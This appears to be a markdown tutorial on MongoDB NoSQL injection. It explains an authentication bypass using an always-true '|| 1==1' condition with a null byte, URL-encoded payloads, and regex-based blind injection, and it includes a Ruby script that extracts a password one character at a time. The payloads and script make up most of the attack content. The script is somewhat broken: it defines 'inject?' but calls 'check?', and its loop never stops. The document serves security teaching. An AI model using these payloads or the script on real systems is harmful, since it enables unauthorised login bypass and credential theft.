# **MongoDB Injection:**
  
  ```bash
     In this section we are going to learn how to inject into MongoDB where we are going to be using the (in)famous ' or 1=1 --
  ```

- From the LDAP injection we have learnt that we need two things to bypass such login interfaces
  - An always true condition
  - A way to correctly terminate the NoSQL query.

- From the MongoDB documentation one can find that the SQL **or 1=1** translates to **|| 1==1**
  (**Note:** the double =)
  - Then by pocking around one can see that a NULL BYTE will prevent MongoDB from using the rest of the query.
  - In some cases one can also use comments **//** or **<!--** to comment out the end of the query.

  - Now having such information, you proceed to analyse the traffic then play around with the payload.
    - https://url?username=admin&password=admin&submit=Submit %7C%7C%201%3D%3D1%00

  - Knowing that MongoDB probably has a password field, one can play around with the application to confirm that.
  - We can take an example where if there was a password that is `password`, we would use the below payload to inject and perform the below tests.
    - Payload: `' && this.password.match(/$PAYLOAD/)NULLBYTE`
      - **Note:** For the payload you have to url encode the `&&` which are `%26%26`.
      - Where inside the brackets ***`(/$PAYLOAD/)`*** we are going to place our regular expressions for testing.
      - **$PAYLOAD**:
        - **`p`** : This one will able to see results because the password contains a letter `p`
        - **`^p`** : This one will able to see results because the password starts with a letter `p`
        - **`e`** : This one will not return any results because tha password does not contain any character with a letter `e`
        - **`^pa.*$`** : This one will able to see results because the password starts with letters `pa`
    - **Note:** You can play around with the payloads, literally fuzz your way around.
    - Also do make sure to confirm the **`password field`**.
  - With this information we can now perform **blind injections** since we have two states, `True` and `False`, but this can be tiresome process to get a valid payload that will retrieve a whole password so the below ruby script will assist us in automating the fuzzing process.

  &nbsp;

  ```ruby
    # A basic script that will allow us to fuzz for NoSQL injections and retrieve passwords from a NoSQL database.

    # Include http library
    require 'httparty'

    # Variable for domain
    URL="url.com"

    # Function
    def inject?(str)
      send = HTTParty.get("http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00")

      # Check if response returns data certain data to return 1475 / True else will return nill / Flase state
      return send.body =~ />admin</
    end

    #puts check?("a").inspect
    #puts check?("aaa").inspect
    # When the above are uncommented gives you the first output as 1475 and the other one as nil it means that it works you can proceed with the below code.

    # A basic script that will allow us to fuzz for NoSQL injections and retrieve passwords from a NoSQL database.


    # Fuzz from a to z, 0 to 9 and add a -, the benefit is that you can also add special characters.
    CHARSET = ('a'..'z').to_a+('0'..'9').to_a+['-']
    # Set password field as empty
    password = ""

    # While loop
    while true
      CHARSET.each do |c|
        puts "Fuzzing character ... ; #{c} for #{password}"
        test = password+c
        if check?("^#{test}.*$")
          password+=c
          puts password
          break
        end
      end
    end
  ```

  - **+1:** In case the password field does not exist for some records (since it's NoSQL database), it's always a good idea to ensure its presence by using ... ` && this.password && this.password.match(\$PAYLOAD\)NULLBYTE `

  - **`Challenge:`** You can create a python script that does this :smile:

  &nbsp;

  - More Resources on **NoSQL Injections**:
    - [SANS SEC642 NoSQL Injection](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1542039176.pdf)
    - [Null Sweep: A NoSQL Injection Primer](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
    - [How to pull off a successful NoSQL Injection attack](https://medium.com/@fiddlycookie/nosql-injection-8732c2140576)
    - [NoSQL Injection Payloads (Look at this for further payload usecases)](https://book.hacktricks.xyz/pentesting-web/nosql-injection)